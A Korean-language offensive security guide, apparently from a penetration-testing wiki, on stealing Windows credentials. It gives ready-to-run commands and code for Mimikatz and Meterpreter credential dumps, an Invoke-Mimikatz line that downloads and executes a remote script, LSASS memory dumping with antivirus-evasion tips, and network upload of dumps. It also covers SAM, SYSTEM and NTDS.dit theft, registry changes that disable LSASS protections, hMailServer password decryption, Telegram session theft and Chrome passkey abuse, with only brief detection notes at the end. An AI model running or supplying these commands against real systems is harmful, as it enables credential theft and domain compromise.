# Windows 자격 증명 탈취

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz 자격 증명
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**[이 페이지](credentials-mimikatz.md)에서 Mimikatz가 수행할 수 있는 다른 작업을 확인하세요.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**여기에서 몇 가지 가능한 credentials 보호 방법을 알아보세요.**](credentials-protections.md) **이러한 보호 기능은 Mimikatz가 일부 credentials를 추출하지 못하게 할 수 있습니다.**

## Credentials with Meterpreter

제가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용하여 victim 내부에서 **password와 hash를 검색**하세요.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV 우회

### Procdump + Mimikatz

**[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)의 Procdump는 정식 Microsoft tool**이므로 Defender에서 탐지되지 않습니다.\
이 tool을 사용하여 **lsass process를 dump**하고, **dump를 download**한 다음 dump에서 **credentials를 로컬로 extract**할 수 있습니다.

[SharpDump](https://github.com/GhostPack/SharpDump)도 사용할 수 있습니다.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
이 프로세스는 [SprayKatz](https://github.com/aas-n/spraykatz)를 사용하여 자동으로 수행됩니다: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**참고**: 일부 **AV**는 **procdump.exe를 사용하여 lsass.exe를 dump**하는 행위를 **malicious**한 것으로 **detect**할 수 있습니다. 이는 **"procdump.exe"와 "lsass.exe" 문자열을 detect**하기 때문입니다. 따라서 **lsass.exe의 이름 대신** lsass.exe의 **PID**를 **argument**로 **procdump에 전달**하는 방식이 더 **stealthier**합니다.

### **comsvcs.dll**을 사용한 lsass Dumping

`C:\Windows\System32`에 있는 **comsvcs.dll**이라는 DLL은 crash 발생 시 **process memory를 dump**하는 역할을 합니다. 이 DLL에는 `rundll32.exe`를 사용하여 호출하도록 설계된 **`MiniDumpW`**라는 **function**이 포함되어 있습니다.\
처음 두 argument는 사용하지 않아도 되지만, 세 번째 argument는 세 가지 구성 요소로 나뉩니다. dump할 process ID가 첫 번째 구성 요소이고, dump file location이 두 번째 구성 요소이며, 세 번째 구성 요소는 반드시 **full**이라는 단어여야 합니다. 다른 옵션은 존재하지 않습니다.\
이 세 가지 구성 요소를 parsing한 후 DLL은 dump file을 생성하고 지정된 process의 memory를 해당 file로 전송합니다.\
**comsvcs.dll**을 사용하여 lsass process를 dump할 수 있으므로 procdump를 upload하고 실행할 필요가 없습니다. 이 방법은 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)에 자세히 설명되어 있습니다.<sup>[[9]](#references)</sup>

다음 command를 사용하여 실행합니다:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**이 프로세스는** [**lssasy**](https://github.com/Hackndo)**를 사용하여 자동화할 수 있습니다.**

### **Task Manager를 사용한 lsass 덤프**

1. 작업 표시줄을 마우스 오른쪽 버튼으로 클릭하고 Task Manager를 클릭합니다.
2. More details를 클릭합니다.
3. Processes 탭에서 "Local Security Authority Process" 프로세스를 찾습니다.
4. "Local Security Authority Process" 프로세스를 마우스 오른쪽 버튼으로 클릭하고 "Create dump file"을 클릭합니다.

### procdump를 사용한 lsass 덤프

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)는 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite의 일부인 Microsoft 서명 바이너리입니다.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade를 사용한 lsass Dumping

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade)는 메모리 dump를 난독화하고 디스크에 저장하지 않은 채 원격 workstation으로 전송할 수 있는 Protected Process Dumper Tool입니다.

**핵심 기능**:

1. PPL protection 우회
2. Defender의 signature-based detection mechanism을 회피하기 위한 메모리 dump 파일 난독화
3. 디스크에 저장하지 않고 RAW 및 SMB upload method를 사용하여 메모리 dump 업로드(fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDump 없이 SSP 기반 LSASS dumping

Ink Dragon은 **LalsDumper**라는 3단계 dumper를 제공하며, `MiniDumpWriteDump`를 전혀 호출하지 않으므로 해당 API에 대한 EDR hook이 작동하지 않습니다:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll`에서 소문자 `d` 32개로 구성된 placeholder를 검색하고, 이를 `rtu.txt`의 absolute path로 덮어쓴 다음 패치된 DLL을 `nfdp.dll`로 저장하고 `AddSecurityPackageA("nfdp","fdp")`를 호출합니다. 이를 통해 **LSASS**가 악성 DLL을 새로운 Security Support Provider (SSP)로 load하도록 강제합니다.
2. **LSASS 내부의 Stage 2** – LSASS가 `nfdp.dll`을 load하면 DLL이 `rtu.txt`를 읽고 각 byte를 `0x20`과 XOR한 뒤, decode된 blob을 memory에 map하고 execution을 전달합니다.
3. **Stage 3 dumper** – map된 payload는 hashed API name(`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`)에서 resolve한 **direct syscalls**를 사용해 MiniDump logic을 재구현합니다. `Tom`이라는 전용 export는 `%TEMP%\<pid>.ddt`를 열고, 압축된 LSASS dump를 file로 stream한 뒤 handle을 닫으므로 이후 exfiltration이 가능합니다.

Operator 참고 사항:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, `rtu.txt`를 같은 directory에 보관합니다. Stage 1은 hard-coded placeholder를 `rtu.txt`의 absolute path로 다시 작성하므로, 파일을 분리하면 chain이 중단됩니다.
* Registration은 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`에 `nfdp`를 추가하는 방식으로 이루어집니다. LSASS가 매 boot마다 SSP를 reload하도록 해당 value를 직접 seed할 수 있습니다.
* `%TEMP%\*.ddt` file은 압축된 dump입니다. 이를 local에서 decompress한 다음 Mimikatz/Volatility에 전달해 credential extraction을 수행합니다.
* `lals.exe`를 실행하려면 admin/SeTcb 권한이 필요하며, 그래야 `AddSecurityPackageA`가 성공합니다. call이 return되면 LSASS는 rogue SSP를 transparently load하고 Stage 2를 실행합니다.
* disk에서 DLL을 제거해도 LSASS에서 해당 DLL이 evict되지는 않습니다. registry entry를 삭제하고 LSASS를 restart(reboot)하거나, 장기 persistence를 위해 그대로 두어야 합니다.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA secrets 덤프
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 대상 DC에서 NTDS.dit 덤프하기
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 대상 DC에서 NTDS.dit 비밀번호 기록 덤프하기
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 각 NTDS.dit 계정의 pwdLastSet 특성 표시
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM 및 SYSTEM 탈취

이 파일들은 _C:\windows\system32\config\SAM_ 및 _C:\windows\system32\config\SYSTEM_에 **위치해야** 합니다. 하지만 보호되어 있기 때문에 **일반적인 방법으로 단순히 복사할 수는 없습니다**.

### 레지스트리에서

이러한 파일을 탈취하는 가장 쉬운 방법은 레지스트리에서 복사본을 가져오는 것입니다:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Kali 머신에** 해당 파일들을 **다운로드**하고 다음을 사용하여 **해시를 추출**합니다:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### 볼륨 섀도 복사본

이 서비스를 사용하여 보호된 파일을 복사할 수 있습니다. Administrator 권한이 필요합니다.

#### vssadmin 사용

vssadmin 바이너리는 Windows Server 버전에서만 사용할 수 있습니다.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
하지만 **Powershell**에서도 동일하게 수행할 수 있습니다. 다음은 **SAM file을 복사하는 방법**의 예시입니다(사용된 하드 드라이브는 "C:"이고 C:\users\Public에 저장됩니다). 하지만 보호된 파일을 복사할 때는 이 방법을 사용할 수 있습니다:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
이 책의 코드: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

마지막으로 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)를 사용하여 SAM, SYSTEM 및 ntds.dit의 복사본을 만들 수도 있습니다.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 자격 증명 - NTDS.dit**

**NTDS.dit** 파일은 **Active Directory**의 핵심으로 알려져 있으며, 사용자 객체, 그룹 및 해당 멤버십에 대한 중요한 데이터를 보유합니다. 도메인 사용자의 **password hash**가 저장되는 곳이기도 합니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 위치합니다.

이 데이터베이스에는 다음 세 개의 주요 테이블이 유지됩니다:

- **Data Table**: 사용자 및 그룹과 같은 객체의 세부 정보를 저장합니다.
- **Link Table**: 그룹 멤버십과 같은 관계를 추적합니다.
- **SD Table**: 각 객체의 **Security descriptor**가 저장되며, 저장된 객체의 보안 및 접근 제어를 보장합니다.

Christoffer Andersson의 database-layer 연구 문서에서는 이러한 테이블과 버전별 동작을 더 자세히 설명합니다.<sup>[[8]](#references)</sup>

Windows는 _Ntdsa.dll_을 사용하여 해당 파일과 상호 작용하며, _lsass.exe_가 이를 사용합니다. 따라서 **NTDS.dit** 파일의 **일부**는 **lsass** 메모리 내부에 있을 수 있습니다(**cache**를 사용한 성능 향상으로 인해 최근에 접근한 데이터를 확인할 수 있을 가능성이 있습니다).

#### NTDS.dit 내부의 hash 복호화

hash는 세 번 암호화됩니다:

1. **BOOTKEY** 및 **RC4**를 사용하여 Password Encryption Key (**PEK**)를 복호화합니다.
2. **PEK** 및 **RC4**를 사용하여 **hash**를 복호화합니다.
3. **DES**를 사용하여 **hash**를 복호화합니다.

**PEK**는 모든 domain controller에서 **동일한 값**을 가지지만, 해당 domain controller의 **SYSTEM** hive에서 가져온 DC별 **BOOTKEY**를 사용하여 **NTDS.dit** 내부에서 암호화됩니다. 따라서 자격 증명을 추출하려면 **NTDS.dit**와 **SYSTEM** (`C:\Windows\System32\config\SYSTEM`)이 모두 필요합니다.

### Ntdsutil을 사용하여 NTDS.dit 복사

Windows Server 2008부터 사용할 수 있습니다.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**volume shadow copy**](#stealing-sam-and-system) 트릭을 사용하여 **ntds.dit** 파일을 복사할 수도 있습니다. 또한 **SYSTEM 파일**의 복사본도 필요하다는 점을 기억하세요(다시 말해, [**레지스트리에서 dump하거나 volume shadow copy**](#stealing-sam-and-system) 트릭을 사용하세요).

### **NTDS.dit에서 해시 추출**

**NTDS.dit** 및 **SYSTEM** 파일을 **확보한** 후에는 _secretsdump.py_와 같은 도구를 사용하여 **해시를 추출**할 수 있습니다:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
유효한 domain admin user를 사용하여 **자동으로 추출**할 수도 있습니다:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**큰 NTDS.dit 파일**의 경우 [gosecretsdump](https://github.com/c-sto/gosecretsdump)를 사용하여 추출하는 것이 좋습니다.

마지막으로 **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ 또는 **mimikatz** `lsadump::lsa /inject`도 사용할 수 있습니다.

### **NTDS.dit에서 도메인 객체를 추출하여 SQLite 데이터베이스로 저장**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)를 사용하면 NTDS 객체를 SQLite 데이터베이스로 추출할 수 있습니다. secrets뿐만 아니라 추가적인 정보 추출을 위해 전체 객체와 해당 attribute도 추출되며, 이는 원본 NTDS.dit 파일을 이미 가져온 경우에 유용합니다.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive는 선택 사항이지만 secrets decryption을 가능하게 합니다(NT 및 LM hashes, cleartext passwords와 같은 supplemental credentials, kerberos 또는 trust keys, NT 및 LM password histories). 다음 데이터도 추출됩니다: hashes가 포함된 user 및 machine accounts, UAC flags, 마지막 logon 및 password change timestamp, accounts description, names, UPN, SPN, groups 및 recursive memberships, organizational units tree 및 membership, trusts type, direction 및 attributes가 포함된 trusted domains...

## Lazagne

[여기](https://github.com/AlessandroZ/LaZagne/releases)에서 binary를 다운로드합니다. 이 binary를 사용하면 여러 software에서 credentials를 추출할 수 있습니다.
```
lazagne.exe all
```
## SAM 및 LSASS에서 credentials를 추출하기 위한 기타 도구

### Windows credentials Editor (WCE)

이 도구를 사용하면 메모리에서 credentials를 추출할 수 있습니다. 다음에서 다운로드하세요: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM 파일에서 credentials 추출하기
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM 파일에서 credentials 추출
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

다음에서 다운로드하세요:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) 그런 다음 **실행하기만 하면** 비밀번호가 추출됩니다.

## 유휴 RDP 세션 마이닝 및 보안 제어 약화

Ink Dragon의 FinalDraft RAT에는 모든 red-teamer에게 유용한 기법을 포함하는 `DumpRDPHistory` tasker가 있습니다:<sup>[[3]](#references)</sup>

### DumpRDPHistory 스타일의 telemetry 수집

* **Outbound RDP 대상** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`의 모든 사용자 hive를 파싱합니다. 각 하위 키에는 서버 이름, `UsernameHint`, 마지막 쓰기 timestamp가 저장됩니다. PowerShell을 사용하여 FinalDraft의 로직을 재현할 수 있습니다:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP 증거** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 로그에서 Event ID **21**(성공적인 logon) 및 **25**(연결 해제)를 조회하여 누가 해당 시스템을 관리했는지 파악합니다:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

어떤 Domain Admin이 정기적으로 연결하는지 파악한 후, 해당 사용자의 **연결이 끊긴** 세션이 아직 존재하는 동안 LSASS를 dump합니다(LalsDumper/Mimikatz 사용). CredSSP + NTLM fallback은 해당 사용자의 verifier와 token을 LSASS에 남기며, 이를 SMB/WinRM을 통해 replay하여 `NTDS.dit`를 탈취하거나 domain controller에 persistence를 구축할 수 있습니다.

### FinalDraft가 대상으로 삼는 Registry downgrade

동일한 implant는 credential theft를 쉽게 만들기 위해 여러 registry key도 변조합니다:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1`을 설정하면 RDP에서 전체 credential/ticket 재사용이 강제되어 pass-the-hash 방식의 pivot이 가능해집니다.
* `LocalAccountTokenFilterPolicy=1`은 UAC token filtering을 비활성화하므로, 로컬 관리자에게 네트워크를 통한 unrestricted token이 부여됩니다.
* `DSRMAdminLogonBehavior=2`를 사용하면 DC가 온라인 상태일 때 DSRM administrator가 로그온할 수 있어, 공격자에게 또 다른 기본 제공 high-privilege account가 생깁니다.
* `RunAsPPL=0`은 LSASS PPL protections를 제거하여 LalsDumper와 같은 dumper가 메모리에 쉽게 액세스할 수 있게 합니다.

## hMailServer database credentials (post-compromise)

hMailServer는 `[Database] Password=` 아래에 DB password를 `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`에 저장합니다. 이 값은 static key `THIS_KEY_IS_NOT_SECRET` 및 4-byte word endianness swaps를 사용해 Blowfish로 암호화됩니다. INI의 hex string을 다음 Python snippet과 함께 사용하세요:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
평문 password를 사용하여 파일 잠금을 피하기 위해 SQL CE database를 복사하고, 32-bit provider를 로드한 다음, 필요한 경우 upgrade한 후 hashes를 쿼리합니다:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` column은 hMailServer hash format(hashcat mode `1421`)을 사용합니다. 이 값을 cracking하면 WinRM/SSH pivots에 재사용 가능한 credentials를 얻을 수 있습니다.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

일부 tooling은 LSA logon callback `LsaApLogonUserEx2`를 intercept하여 **plaintext logon passwords**를 capture합니다. 핵심은 authentication package callback을 hook하거나 wrap하여 credentials를 **logon 중**(hashing 전)에 capture한 다음, 이를 disk에 기록하거나 operator에게 반환하는 것입니다. 이는 일반적으로 LSA에 inject하거나 등록하는 helper로 구현되며, 각 successful interactive/network logon event의 username, domain 및 password를 기록합니다.<sup>[[1]](#references)</sup>

Operational notes:
- authentication path에 helper를 load하려면 local admin/SYSTEM 권한이 필요합니다.
- Captured credentials는 logon이 발생할 때만 나타납니다(hook에 따라 interactive, RDP, service 또는 network logon).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS)는 per-user `sqlstudio.bin` file에 saved connection information을 저장합니다. Dedicated dumpers는 file을 parse하여 saved SQL credentials를 recover할 수 있습니다. command output만 반환하는 shells에서는 file을 Base64로 encoding하고 stdout에 출력하여 exfiltrate하는 경우가 많습니다.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
운영자 측에서 파일을 다시 빌드하고 dumper를 로컬에서 실행하여 credentials를 복구합니다:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Telegram Desktop `tdata` 세션 탈취

Telegram Desktop은 인증 및 계정 상태를 **`tdata`** 디렉터리에 저장합니다. 복사된 세션은 호환되는 tooling으로 로드하여 해당 인증이 유효한 동안 계정 비밀번호 없이 인증에 사용할 수 있습니다. 로컬 데이터 암호화가 활성화되어 있는 경우 stealer에는 패스코드도 필요합니다. 이후 인증된 세션을 통해 신원 데이터, 대화 및 멤버십 메타데이터, 메시지, 다운로드 가능한 미디어가 노출될 수 있습니다.<sup>[[10]](#references)</sup>

### 검색 및 획득

설치형 및 portable 레이아웃을 모두 검색합니다. Microsoft Store 패키지 이름은 다양할 수 있으므로 `TelegramMessenge`가 포함된 패키지 디렉터리를 열거하고 해당 디렉터리의 `LocalCache\Roaming` 하위 트리를 검사합니다.<sup>[[10]](#references)</sup>
```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
Where-Object Name -Like '*TelegramMessenge*' |
ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```
일반적인 읽기가 실패하고 프로세스 token에 `SeBackupPrivilege`가 **이미 포함되어 활성화된** 경우, backup-aware access는 대체 수단을 제공하지만 privilege를 획득하거나 프로세스를 elevate하지는 않습니다. `FILE_FLAG_BACKUP_SEMANTICS`와 함께 `CreateFileW`를 사용하면 backup/restore semantics를 요청하고 필요한 token privileges가 있는 경우 파일 보안 검사를 우회할 수 있지만, 해당 flag만으로는 호환되지 않는 sharing lock을 무력화할 수 없습니다.<sup>[[10]](#references)[[11]](#references)</sup>

실행 중인 locked files의 경우 **Volume Shadow Copy**를 생성하고, ACL로 차단된 파일의 경우 `robocopy /B`가 backup mode를 사용하여 파일 및 directory ACL을 우회합니다.<sup>[[10]](#references)[[12]](#references)</sup>
```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```
대역폭을 고려하는 implant는 먼저 파일 경로 목록만 제출하고, C2에 이미 저장된 경로와 함께 snapshot identifier를 받은 뒤 누락된 파일만 업로드할 수 있습니다. 따라서 재귀적인 `tdata` 열거 후에 이루어지는 소규모 incremental transfer도 성공적인 session theft를 나타낼 수 있습니다.<sup>[[10]](#references)</sup>

### 탐지 및 차단

비-Telegram 프로세스의 `tdata` 재귀 접근을 `SeBackupPrivilege` 활성화, backup-semantics 파일 열기, VSS 활동 또는 `/B`를 사용하는 자식 `robocopy.exe`와 연관 지어 분석하세요. 또한 `%APPDATA%`와 `%LOCALAPPDATA%\Packages`를 빠르게 열거한 뒤 동일한 프로세스에서 outbound connection이 발생하는지도 탐색하세요. compromise 후에는 **Settings → Devices**(또는 **Privacy & Security → Active Sessions**)를 사용해 인식할 수 없는 session을 종료하세요. two-step verification만 활성화해도 이미 탈취된 authorization은 revoke되지 않습니다.<sup>[[10]](#references)[[13]](#references)</sup>

## Windows의 Chrome에서 Passkeys / WebAuthn credential theft

**Chrome + Google Password Manager synced passkeys**를 사용하는 Windows 호스트에서 **victim user** 권한으로 code execution을 확보하면, **admin/SYSTEM 없이도** passkeys가 흥미로운 post-exploitation 대상이 됩니다.<sup>[[4]](#references)</sup>

### 흥미로운 로컬 artifact
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`**는 protobuf로 인코딩된 **`WebauthnCredentialSpecifics`** 레코드를 저장합니다. 동일 사용자의 프로세스는 동기화된 passkey의 **RP ID**, **username**, **credential ID**, 암호화된 private-key 자료를 열거할 수 있습니다.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`**는 **`wrapped_identity_private_key`** 및 동기화된 credentials를 복구하는 데 사용되는 래핑된 secret과 같은 로컬 device-enrollment 상태를 저장합니다.<sup>[[4]](#references)</sup>

빠른 초기 점검:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blob은 여전히 local signing oracle로 악용될 수 있음

브라우저가 **`NCRYPT_OPAQUE_KEY_BLOB`** 형식으로 TPM-backed identity key를 export하고 해당 blob을 사용자가 접근할 수 있는 상태에 저장한다면, malware는 raw private key를 extract할 필요가 없습니다. 단순히 **동일한 machine**에서 blob을 다시 import한 다음, local TPM에 attacker-controlled data의 sign을 요청하면 됩니다:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
이는 **hardware binding이 off-device export는 방지하지만, compromised endpoint에서 동일 사용자가 사용하는 것은 방지하지 못한다는 의미입니다**.

### 실질적인 악용 경로

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Chrome의 LevelDB에서 `WebauthnCredentialSpecifics`를 열거합니다.
- passkey 로그인을 시작하고 새로운 WebAuthn challenge를 획득합니다.
- 피해자 TPM에서 탈취한 `wrapped_identity_private_key` blob을 사용해 cloud-authenticator request binding에 서명합니다.
- 반환된 assertion을 relying party로 relay합니다.
- RP가 `userVerification=preferred`를 허용하거나 **`UV=0`인 assertion을 거부하지 못할 때** 특히 유용합니다.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- `passkey_enclave_state`를 삭제하거나 유효한 서명된 `device/forget` operation을 전송해 re-onboarding을 강제합니다.
- onboarding 후 장치가 **`uv_key_pending`** 상태로 남아 있다면, attacker가 제어하는 UV public key를 등록합니다.
- provider가 새 UV key에 대한 attestation / secure-hardware origin을 검증하지 않으면, 이후 attacker key에서 생성된 서명은 **`UV=1`**로 처리됩니다.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- recovery 또는 rejoin을 강제해 Chrome이 synced-passkey master secret을 가져오도록 합니다.
- `passkey_enclave_state`의 재생성 또는 수정 여부를 감시한 다음, plaintext **security domain secret (SDS)**가 메모리에 존재하는 동안 Chrome memory를 dump합니다.
- 복구한 SDS를 사용해 모든 `WebauthnCredentialSpecifics` record의 encrypted field를 복호화하고 portable WebAuthn private key를 복구합니다.

### DFIR / detection 아이디어

- **`passkey_enclave_state`의 삭제/재생성**을 모니터링합니다.<sup>[[4]](#references)</sup>
